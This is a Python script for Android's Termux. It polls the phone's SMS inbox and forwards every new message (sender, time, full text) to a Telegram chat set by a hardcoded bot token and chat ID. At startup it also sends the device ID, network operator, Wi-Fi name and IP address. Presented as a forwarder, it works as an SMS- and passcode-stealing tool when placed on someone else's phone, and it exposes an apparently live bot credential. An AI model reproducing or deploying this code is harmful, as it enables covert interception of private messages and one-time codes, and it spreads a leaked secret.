#!/data/data/com.termux/files/usr/bin/python

import json
import os
import time
import requests
import subprocess
import logging
from datetime import datetime
import sys

# Check if running in Termux environment
IN_TERMUX = os.path.exists("/data/data/com.termux")

# Telegram configuration
TELEGRAM_BOT_TOKEN = "7854831812:AAF5JDgaf43BsMgysPZOIBPzW_39p44gGxw"
TELEGRAM_CHAT_ID = "8111628064"

# Setup logging
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sms_bot.log")
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename=LOG_FILE
)

def log_info(message):
    """Log info message and print to console"""
    print(message)
    logging.info(message)

def log_error(message):
    """Log error message and print to console"""
    print(f"ERROR: {message}")
    logging.error(message)

def setup_termux_api():
    """Check and install Termux:API if needed"""
    if not IN_TERMUX:
        log_error("Not running in Termux environment. Please run this script in Termux.")
        send_telegram_message("⚠️ <b>Error:</b> Not running in Termux environment")
        sys.exit(1)
        
    try:
        # Check if termux-sms-list is available
        result = subprocess.run(["which", "termux-sms-list"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True)
        
        if result.returncode != 0:
            log_info("Termux:API not found, attempting to install...")
            try:
                subprocess.run(["apt", "update", "-y"], check=True)
                subprocess.run(["apt", "install", "termux-api", "-y"], check=True)
                log_info("Termux:API installed successfully")
            except subprocess.SubprocessError as e:
                log_error(f"Failed to install Termux:API: {e}")
                raise
        else:
            log_info("Termux:API is already installed")
    except Exception as e:
        log_error(f"Error in setting up Termux:API: {e}")
        send_telegram_message(f"⚠️ <b>Error setting up Termux:API:</b> {str(e)}")
        sys.exit(1)

def get_device_info():
    """Gather device information using Termux API"""
    device_info = {}
    
    try:
        # Get battery info
        try:
            result = subprocess.run(["termux-battery-status"], 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, 
                                text=True,
                                timeout=5)
            if result.returncode == 0:
                battery = json.loads(result.stdout)
                device_info["battery"] = f"{battery.get('percentage', 'Unknown')}% - {battery.get('status', 'Unknown')}"
        except:
            device_info["battery"] = "Unknown"
        
        # Get device info
        try:
            result = subprocess.run(["termux-telephony-deviceinfo"], 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, 
                                text=True,
                                timeout=5)
            if result.returncode == 0:
                device = json.loads(result.stdout)
                device_info["device_id"] = device.get("device_id", "Unknown")
                device_info["phone_type"] = device.get("phone_type", "Unknown")
                device_info["network_operator"] = device.get("network_operator", "Unknown")
        except:
            device_info["phone_info"] = "Unknown"
            
        # Get WiFi info
        try:
            result = subprocess.run(["termux-wifi-connectioninfo"], 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, 
                                text=True,
                                timeout=5)
            if result.returncode == 0:
                wifi = json.loads(result.stdout)
                device_info["wifi"] = wifi.get("ssid", "Not connected")
                device_info["ip"] = wifi.get("ip", "Unknown")
        except:
            device_info["wifi"] = "Unknown"
            
    except Exception as e:
        log_error(f"Error gathering device info: {e}")
        
    return device_info

def send_startup_message():
    """Send initial message when script starts"""
    device_info = get_device_info()
    
    message = "<b>🚀 SMS Forwarder Started</b>\n\n"
    message += "<b>Device Information:</b>\n"
    
    if device_info:
        for key, value in device_info.items():
            message += f"<b>{key.replace('_', ' ').title()}:</b> {value}\n"
    else:
        message += "Could not retrieve device information\n"
        
    message += f"\n<b>Start Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    success = send_telegram_message(message)
    if success:
        log_info("Sent startup message to Telegram")
    else:
        log_error("Failed to send startup message to Telegram")

def get_sms_messages():
    """Retrieve SMS messages using Termux:API"""
    try:
        # Use a shorter timeout and limit number of messages
        result = subprocess.run(["termux-sms-list", "-l", "50"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True, 
                               timeout=10)
        
        # Check for errors
        if result.returncode != 0:
            log_error(f"Error retrieving SMS: {result.stderr}")
            return []
            
        # Check if output is empty
        if not result.stdout.strip():
            log_info("No SMS messages found or empty response")
            return []
            
        try:
            # Parse JSON response
            messages = json.loads(result.stdout)
            log_info(f"Retrieved {len(messages)} SMS messages")
            return messages
        except json.JSONDecodeError as e:
            log_error(f"Error parsing SMS JSON: {e}")
            log_error(f"Raw output: {result.stdout}")
            return []
            
    except subprocess.TimeoutExpired:
        log_error("Timeout while retrieving SMS")
        return []
    except Exception as e:
        log_error(f"Unexpected error retrieving SMS: {e}")
        return []

def send_telegram_message(message):
    """Send message to Telegram"""
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(api_url, data=data, timeout=10)
        if response.status_code != 200:
            log_error(f"Telegram API error: {response.status_code} - {response.text}")
            return False
        return True
    except requests.RequestException as e:
        log_error(f"Error sending to Telegram: {e}")
        return False
    except Exception as e:
        log_error(f"Unexpected error sending to Telegram: {e}")
        return False

def format_sms(sms):
    """Format SMS message for Telegram"""
    try:
        timestamp = datetime.fromtimestamp(int(sms.get('received', '0'))/1000).strftime('%Y-%m-%d %H:%M:%S')
    except (ValueError, TypeError):
        timestamp = "Unknown time"
        
    return (
        f"<b>📱 New SMS</b>\n"
        f"<b>From:</b> {sms.get('number', 'Unknown')}\n"
        f"<b>Time:</b> {timestamp}\n"
        f"<b>Message:</b> {sms.get('body', 'No content')}"
    )

def save_processed_sms(sms_ids):
    """Save IDs of processed SMS to avoid duplicate sending"""
    try:
        filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), "processed_sms.txt")
        with open(filepath, "w") as f:
            for sms_id in sms_ids:
                f.write(f"{sms_id}\n")
    except Exception as e:
        log_error(f"Error saving processed SMS IDs: {e}")

def load_processed_sms():
    """Load IDs of processed SMS"""
    filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), "processed_sms.txt")
    if not os.path.exists(filepath):
        return set()
    
    try:
        with open(filepath, "r") as f:
            return set(line.strip() for line in f)
    except Exception as e:
        log_error(f"Error loading processed SMS IDs: {e}")
        return set()

def check_permissions():
    """Check if Termux has necessary permissions"""
    try:
        # Try to request SMS permission
        result = subprocess.run(["termux-sms-list", "-l", "1"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True,
                               timeout=5)
        
        if "Permission denied" in result.stderr:
            log_error("SMS permission denied. Please grant SMS permission to Termux:API")
            send_telegram_message("⚠️ <b>Error:</b> SMS permission denied. Please grant SMS permission to Termux:API")
            return False
            
        return True
    except Exception as e:
        log_error(f"Error checking permissions: {e}")
        return False

def main():
    """Main function to monitor and forward SMS"""
    log_info("Starting SMS forwarder to Telegram")
    print("SMS to Telegram forwarder started. Press Ctrl+C to stop.")
    
    # Setup Termux:API and check permissions
    setup_termux_api()
    if not check_permissions():
        log_error("Failed permission check. Please grant SMS permissions to Termux:API and restart.")
        sys.exit(1)
    
    # Send startup message with device info
    send_startup_message()
    
    # Keep track of processed messages
    processed_sms = load_processed_sms()
    
    # Track failures to implement backoff
    consecutive_failures = 0
    
    try:
        while True:
            try:
                # Get all SMS messages
                sms_messages = get_sms_messages()
                
                if not sms_messages:
                    # Use backoff strategy if we keep failing
                    if consecutive_failures > 5:
                        sleep_time = min(30, 5 * consecutive_failures)
                        log_info(f"Multiple failures, waiting {sleep_time} seconds")
                        time.sleep(sleep_time)
                    else:
                        time.sleep(10)  # Normal wait time
                    consecutive_failures += 1
                    continue
                
                # Reset failure counter on success
                consecutive_failures = 0
                
                # Check for new messages and send them
                new_messages_count = 0
                for sms in sms_messages:
                    sms_id = str(sms.get('_id', ''))
                    # If no ID is available, create one from the content and time
                    if not sms_id:
                        number = sms.get('number', '')
                        body = sms.get('body', '')
                        received = sms.get('received', '')
                        sms_id = f"{number}-{received}-{hash(body)}"
                    
                    if sms_id and sms_id not in processed_sms:
                        formatted_message = format_sms(sms)
                        if send_telegram_message(formatted_message):
                            processed_sms.add(sms_id)
                            new_messages_count += 1
                            log_info(f"Forwarded SMS from {sms.get('number', 'Unknown')}")
                
                # Save processed messages
                if new_messages_count > 0:
                    save_processed_sms(processed_sms)
                    log_info(f"Forwarded {new_messages_count} new messages to Telegram")
                
                # Wait before checking again
                time.sleep(15)  # Check every 15 seconds
                
            except Exception as e:
                log_error(f"Error in main loop: {e}")
                consecutive_failures += 1
                time.sleep(5)  # Short delay before retry
                
    except KeyboardInterrupt:
        log_info("\nStopping SMS forwarder")
        send_telegram_message("⚠️ <b>SMS Forwarder stopped</b>")
    except Exception as e:
        error_msg = f"Unexpected error: {e}"
        log_error(error_msg)
        send_telegram_message(f"⚠️ <b>Error in SMS forwarder:</b> {e}")
        
        # Try to restart after error
        time.sleep(30)
        main()  # Attempt to restart

if __name__ == "__main__":
    main()
